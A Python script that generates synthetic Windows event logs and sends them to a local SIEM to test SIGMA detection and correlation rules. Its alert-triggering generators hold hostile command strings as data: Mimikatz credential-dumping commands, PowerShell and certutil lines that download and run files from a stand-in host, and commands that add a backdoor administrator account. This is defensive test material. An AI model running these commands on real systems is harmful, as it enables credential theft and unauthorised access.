#!/usr/bin/env python3
"""
SIGMA Test Data Generator
Generates 1000+ events with SIGMA-normalized fields for testing

Usage: python tools/generate_sigma_test_data.py
"""

import json
import random
import time
import uuid
import requests
from datetime import datetime, timedelta
from typing import List, Dict, Any

# Configuration
JSON_LISTENER_URL = "http://localhost:8081/api/v1/ingest/json"
CLICKHOUSE_HOST = "localhost"
CLICKHOUSE_PORT = 9000

def clear_clickhouse_data():
    """Clear existing events and alerts from ClickHouse"""
    try:
        import clickhouse_connect
        client = clickhouse_connect.get_client(
            host=CLICKHOUSE_HOST,
            port=8123,  # HTTP port
            database='cerberus',
            username='default',
            password='testpass123'
        )
        client.command("TRUNCATE TABLE IF EXISTS events")
        client.command("TRUNCATE TABLE IF EXISTS alerts")
        return True
    except Exception as e:
        print(f"    Warning: Could not clear ClickHouse data: {e}")
        print("    Trying HTTP API...")
        try:
            # Try HTTP API
            resp = requests.post(
                f"http://{CLICKHOUSE_HOST}:8123",
                params={'user': 'default', 'password': 'testpass123', 'database': 'cerberus'},
                data="TRUNCATE TABLE IF EXISTS events"
            )
            resp = requests.post(
                f"http://{CLICKHOUSE_HOST}:8123",
                params={'user': 'default', 'password': 'testpass123', 'database': 'cerberus'},
                data="TRUNCATE TABLE IF EXISTS alerts"
            )
            return True
        except Exception as e2:
            print(f"    Warning: HTTP API also failed: {e2}")
            return False


class SIGMAEventGenerator:
    def __init__(self):
        self.users = ["jdoe", "asmith", "bwilson", "mjohnson", "user1", "admin"]
        self.computers = [f"WORKSTATION-{i:02d}" for i in range(50)]

    def random_ip(self, external=False):
        if external:
            return f"{random.choice([192, 198, 203])}.{random.randint(0, 255)}.{random.randint(100, 200)}.{random.randint(1, 254)}"
        return f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def random_user(self):
        return random.choice(self.users)

    def random_computer(self):
        return random.choice(self.computers)

    def random_hash(self):
        return f"MD5={uuid.uuid4().hex.upper()}"

    # Normal event generators
    def generate_normal_process(self, event_time: datetime) -> Dict[str, Any]:
        processes = [
            ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "C:\\Windows\\System32\\services.exe"),
            ("C:\\Windows\\explorer.exe", "explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
            ("C:\\Windows\\System32\\notepad.exe", "notepad.exe", "C:\\Windows\\explorer.exe"),
        ]
        p = random.choice(processes)
        return {
            "EventID": "1",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "process_creation",
            "Image": p[0],
            "CommandLine": p[1],
            "ParentImage": p[2],
            "ProcessId": random.randint(1000, 65535),
            "ParentProcessId": random.randint(1, 1000),
            "IntegrityLevel": "Medium",
            "Hashes": self.random_hash(),
        }

    def generate_normal_network(self, event_time: datetime) -> Dict[str, Any]:
        return {
            "EventID": "3",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "network_connection",
            "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "SourceIp": self.random_ip(),
            "DestinationIp": random.choice(["142.250.80.14", "13.107.21.200", "151.101.1.69"]),
            "SourcePort": random.randint(1024, 60000),
            "DestinationPort": random.choice([80, 443]),
            "Protocol": "tcp",
        }

    def generate_normal_file(self, event_time: datetime) -> Dict[str, Any]:
        files = [
            "C:\\Users\\user\\Documents\\report.docx",
            "C:\\Users\\user\\Downloads\\photo.jpg",
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Chrome.lnk",
        ]
        return {
            "EventID": "11",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "file_event",
            "Image": "C:\\Windows\\explorer.exe",
            "TargetFilename": random.choice(files),
        }

    def generate_normal_auth(self, event_time: datetime) -> Dict[str, Any]:
        return {
            "EventID": "4624",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "DC01",
            "User": self.random_user(),
            "Category": "authentication",
            "LogonType": random.choice([2, 3, 10]),
            "TargetUserName": self.random_user(),
            "TargetDomainName": "CORP",
            "IpAddress": self.random_ip(),
            "AuthResult": "success",
        }

    def generate_normal_dns(self, event_time: datetime) -> Dict[str, Any]:
        domains = ["google.com", "microsoft.com", "github.com", "cloudflare.com"]
        return {
            "EventID": "22",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "dns_query",
            "QueryName": random.choice(domains),
            "QueryResults": "104.21.25.158",
        }

    # Alert-triggering event generators
    def generate_credential_dump(self, event_time: datetime) -> Dict[str, Any]:
        """Mimikatz-like command line detection"""
        commands = [
            "privilege::debug sekurlsa::logonpasswords exit",
            "sekurlsa::logonpasswords",
            "lsadump::sam /system:system.hiv /sam:sam.hiv",
        ]
        return {
            "EventID": "1",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "DC01",
            "User": "Administrator",
            "Category": "process_creation",
            "Image": "C:\\Tools\\credential_tool.exe",
            "CommandLine": random.choice(commands),
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ProcessId": random.randint(1000, 65535),
            "ParentProcessId": random.randint(1, 1000),
            "IntegrityLevel": "High",
        }

    def generate_powershell_download(self, event_time: datetime) -> Dict[str, Any]:
        """PowerShell download detection"""
        scripts = [
            "IEX (New-Object Net.WebClient).DownloadString('http://test.example.com/script.ps1')",
            "Invoke-WebRequest -Uri 'http://test.example.com/file.exe' -OutFile 'C:\\temp\\file.exe'",
            "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://test.example.com/tool.exe', 'tool.exe')",
        ]
        return {
            "EventID": "4104",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "ps_script",
            "ScriptBlockText": random.choice(scripts),
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        }

    def generate_lsass_access(self, event_time: datetime) -> Dict[str, Any]:
        """LSASS memory access detection"""
        access_modes = ["0x1010", "0x1410", "0x147a", "0x143a"]
        return {
            "EventID": "10",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": "Administrator",
            "Category": "process_access",
            "SourceImage": "C:\\Users\\user\\Desktop\\debug_tool.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": random.choice(access_modes),
        }

    def generate_suspicious_process(self, event_time: datetime) -> Dict[str, Any]:
        """Suspicious process creation"""
        suspicious = [
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net user testuser TestPass123! /add"),
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net localgroup administrators testuser /add"),
            ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://test.example.com/file.exe C:\\temp\\file.exe"),
        ]
        s = random.choice(suspicious)
        return {
            "EventID": "1",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": "Administrator",
            "Category": "process_creation",
            "Image": s[0],
            "CommandLine": s[1],
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ProcessId": random.randint(1000, 65535),
            "ParentProcessId": random.randint(1, 1000),
            "IntegrityLevel": "High",
        }

    def generate_sensitive_file_access(self, event_time: datetime) -> Dict[str, Any]:
        """Sensitive file access"""
        sensitive_files = [
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Users\\Administrator\\Desktop\\passwords.xlsx",
        ]
        return {
            "EventID": "11",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": "Administrator",
            "Category": "file_event",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "TargetFilename": random.choice(sensitive_files),
            "event_subtype": "suspicious_file_access",
        }

    def generate_suspicious_dns(self, event_time: datetime) -> Dict[str, Any]:
        """DNS query to suspicious domain"""
        suspicious_domains = [
            "c2-server.example.xyz",
            "download.test-malware.ru",
            "exfil.data-test.cn",
        ]
        return {
            "EventID": "22",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": self.random_computer(),
            "User": self.random_user(),
            "Category": "dns_query",
            "QueryName": random.choice(suspicious_domains),
            "QueryResults": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }

    # Correlation rule event generators
    def generate_failed_login(self, event_time: datetime, source_ip: str, target_user: str) -> Dict[str, Any]:
        return {
            "EventID": "4625",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "DC01",
            "User": target_user,
            "Category": "authentication",
            "LogonType": 3,
            "TargetUserName": target_user,
            "TargetDomainName": "CORP",
            "IpAddress": source_ip,
            "SourceIp": source_ip,
            "AuthResult": "failed",
            "event_subtype": "failed_login_brute_force",
            "failure_reason": "bad_password",
            "source_ip": source_ip,
            "auth_result": "failed",
        }

    def generate_successful_login(self, event_time: datetime, source_ip: str, target_user: str) -> Dict[str, Any]:
        return {
            "EventID": "4624",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "DC01",
            "User": target_user,
            "Category": "authentication",
            "LogonType": 3,
            "TargetUserName": target_user,
            "TargetDomainName": "CORP",
            "IpAddress": source_ip,
            "SourceIp": source_ip,
            "AuthResult": "success",
            "event_subtype": "successful_login",
            "source_ip": source_ip,
            "auth_result": "success",
        }

    def generate_rdp_connection(self, event_time: datetime, source_ip: str, dest_ip: str) -> Dict[str, Any]:
        return {
            "EventID": "3",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "WORKSTATION-01",
            "User": "Administrator",
            "Category": "network_connection",
            "Image": "C:\\Windows\\System32\\mstsc.exe",
            "SourceIp": source_ip,
            "DestinationIp": dest_ip,
            "SourcePort": random.randint(1024, 60000),
            "DestinationPort": 3389,
            "Protocol": "tcp",
            "event_subtype": "rdp_connection",
            "source_ip": source_ip,
        }

    def generate_smb_connection(self, event_time: datetime, source_ip: str, dest_ip: str) -> Dict[str, Any]:
        return {
            "EventID": "3",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "WORKSTATION-02",
            "User": "Administrator",
            "Category": "network_connection",
            "Image": "C:\\Windows\\System32\\svchost.exe",
            "SourceIp": source_ip,
            "DestinationIp": dest_ip,
            "SourcePort": random.randint(1024, 60000),
            "DestinationPort": 445,
            "Protocol": "tcp",
            "event_subtype": "smb_connection",
            "source_ip": source_ip,
        }

    def generate_port_scan(self, event_time: datetime, source_ip: str, dest_ip: str, port: int) -> Dict[str, Any]:
        return {
            "EventID": "3",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "FIREWALL-01",
            "User": "SYSTEM",
            "Category": "network_connection",
            "SourceIp": source_ip,
            "DestinationIp": dest_ip,
            "SourcePort": random.randint(1024, 60000),
            "DestinationPort": port,
            "Protocol": "tcp",
            "event_subtype": "port_scan_detection",
            "connection_state": "syn_sent",
            "source_ip": source_ip,
        }

    def generate_large_data_transfer(self, event_time: datetime, source_ip: str, dest_ip: str) -> Dict[str, Any]:
        return {
            "EventID": "3",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "WORKSTATION-10",
            "User": self.random_user(),
            "Category": "network_connection",
            "Image": "C:\\Windows\\System32\\curl.exe",
            "SourceIp": source_ip,
            "DestinationIp": dest_ip,
            "SourcePort": random.randint(1024, 60000),
            "DestinationPort": 443,
            "Protocol": "tcp",
            "event_subtype": "large_data_transfer",
            "bytes_sent": 104857600,  # 100MB
            "source_ip": source_ip,
        }

    def generate_privileged_command(self, event_time: datetime) -> Dict[str, Any]:
        return {
            "EventID": "1",
            "EventTime": event_time.isoformat() + "Z",
            "Computer": "DC01",
            "User": "SYSTEM",
            "Category": "process_creation",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c net user testuser TestPass123! /add && net localgroup administrators testuser /add",
            "ParentImage": "C:\\Windows\\System32\\services.exe",
            "ProcessId": random.randint(1000, 65535),
            "ParentProcessId": random.randint(1, 1000),
            "IntegrityLevel": "System",
            "event_subtype": "privileged_command_execution",
        }


def generate_all_events(gen: SIGMAEventGenerator) -> List[Dict[str, Any]]:
    """Generate all test events"""
    events = []
    base_time = datetime.utcnow() - timedelta(hours=2)

    # Generate normal background traffic (800 events)
    print("    Generating normal background traffic...")
    generators = [
        gen.generate_normal_process,
        gen.generate_normal_network,
        gen.generate_normal_file,
        gen.generate_normal_auth,
        gen.generate_normal_dns,
    ]
    for i in range(800):
        event_time = base_time + timedelta(seconds=i*5)
        events.append(random.choice(generators)(event_time))

    # Generate alert-triggering events (50+ events)
    print("    Generating alert-triggering events...")

    # Credential dump detection (5 events)
    for i in range(5):
        events.append(gen.generate_credential_dump(base_time + timedelta(seconds=100+i*60)))

    # PowerShell download detection (5 events)
    for i in range(5):
        events.append(gen.generate_powershell_download(base_time + timedelta(seconds=200+i*60)))

    # LSASS access detection (5 events)
    for i in range(5):
        events.append(gen.generate_lsass_access(base_time + timedelta(seconds=300+i*60)))

    # Suspicious process creation (10 events)
    for i in range(10):
        events.append(gen.generate_suspicious_process(base_time + timedelta(seconds=400+i*60)))

    # Sensitive file access (10 events)
    for i in range(10):
        events.append(gen.generate_sensitive_file_access(base_time + timedelta(seconds=500+i*60)))

    # DNS queries to suspicious domains (10 events)
    for i in range(10):
        events.append(gen.generate_suspicious_dns(base_time + timedelta(seconds=600+i*60)))

    # Generate events for correlation rules
    print("    Generating correlation rule trigger events...")

    # Correlation 1: Brute Force then Success
    attacker_ip = "203.0.113.50"
    target_user = "admin"
    brute_force_start = base_time + timedelta(minutes=70)

    # 20 failed login attempts
    for i in range(20):
        events.append(gen.generate_failed_login(brute_force_start + timedelta(seconds=i*2), attacker_ip, target_user))
    # Successful login after brute force
    events.append(gen.generate_successful_login(brute_force_start + timedelta(seconds=50), attacker_ip, target_user))

    # Correlation 2: Lateral Movement (RDP then SMB)
    lateral_ip = "10.0.1.100"
    target1 = "10.0.2.10"
    target2 = "10.0.3.15"
    lateral_start = base_time + timedelta(minutes=80)

    events.append(gen.generate_rdp_connection(lateral_start, lateral_ip, target1))
    events.append(gen.generate_smb_connection(lateral_start + timedelta(minutes=2), target1, target2))

    # Correlation 3: Recon to Exploit (Port scan then RDP)
    scanner_ip = "192.0.2.100"
    scan_target = "10.0.4.50"
    recon_start = base_time + timedelta(minutes=90)

    # Port scan events
    ports = [21, 22, 23, 80, 443, 445, 3389, 8080]
    for i in range(15):
        events.append(gen.generate_port_scan(recon_start + timedelta(seconds=i), scanner_ip, scan_target, ports[i % len(ports)]))
    # Successful RDP after scan
    events.append(gen.generate_rdp_connection(recon_start + timedelta(minutes=5), scanner_ip, scan_target))

    # Correlation 4: Data Access then Exfil
    data_thief = "10.0.5.25"
    exfil_target = "198.51.100.50"
    data_start = base_time + timedelta(minutes=100)

    events.append(gen.generate_sensitive_file_access(data_start))
    events.append(gen.generate_large_data_transfer(data_start + timedelta(minutes=3), data_thief, exfil_target))

    # Correlation 5: Privilege Escalation Chain
    priv_esc_start = base_time + timedelta(minutes=110)
    events.append(gen.generate_sensitive_file_access(priv_esc_start))
    events.append(gen.generate_privileged_command(priv_esc_start + timedelta(minutes=2)))

    # Add more normal events to reach 1000+
    remaining_count = 1050 - len(events)
    if remaining_count > 0:
        for i in range(remaining_count):
            event_time = base_time + timedelta(seconds=3600+i*5)
            events.append(random.choice(generators)(event_time))

    return events


def send_events_to_listener(events: List[Dict[str, Any]]) -> tuple:
    """Send events to JSON listener"""
    success = 0
    fail = 0

    session = requests.Session()

    for i, event in enumerate(events):
        # Wrap event with event_id and timestamp
        wrapped_event = {
            "event_id": str(uuid.uuid4()),
            "timestamp": event.get("EventTime", datetime.utcnow().isoformat() + "Z"),
        }
        wrapped_event.update(event)

        try:
            resp = session.post(
                JSON_LISTENER_URL,
                json=wrapped_event,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            if resp.status_code >= 200 and resp.status_code < 300:
                success += 1
            else:
                fail += 1
                if i < 5:
                    print(f"    Warning: Event {i} returned status {resp.status_code}")
        except Exception as e:
            fail += 1
            if i < 5:
                print(f"    Warning: Failed to send event {i}: {e}")

        # Progress indicator every 100 events
        if (i + 1) % 100 == 0:
            print(f"    Progress: {i+1}/{len(events)} events sent")

        # Small delay to avoid overwhelming the listener
        time.sleep(0.005)

    return success, fail


def main():
    print("=== SIGMA Test Data Generator ===")
    print()

    # Step 1: Clear ClickHouse data
    print("[1/4] Clearing existing events and alerts from ClickHouse...")
    if clear_clickhouse_data():
        print("    OK - Events and alerts cleared successfully")
    else:
        print("    WARNING - Could not clear data, continuing anyway...")

    # Step 2: Generate events
    print("\n[2/4] Generating test events with SIGMA-normalized fields...")
    gen = SIGMAEventGenerator()
    events = generate_all_events(gen)
    print(f"    OK - Generated {len(events)} events")

    # Step 3: Send events to JSON listener
    print(f"\n[3/4] Sending events to JSON listener ({JSON_LISTENER_URL})...")
    success_count, fail_count = send_events_to_listener(events)
    print(f"    OK - Sent {success_count} events successfully, {fail_count} failed")

    # Step 4: Summary
    print("\n[4/4] Generation complete!")
    print("\n=== Summary ===")
    print(f"Total events generated: {len(events)}")
    print(f"Events designed to trigger alerts: 50+")
    print("\nCorrelation rules to be triggered:")
    print("  - Brute Force Followed by Successful Login")
    print("  - Lateral Movement via RDP and SMB")
    print("  - Reconnaissance to Exploitation")
    print("  - Sensitive Data Access Followed by Exfiltration")
    print("  - Privilege Escalation Chain")
    print("\nCheck the dashboard at http://localhost:8080 to verify alerts")


if __name__ == "__main__":
    main()
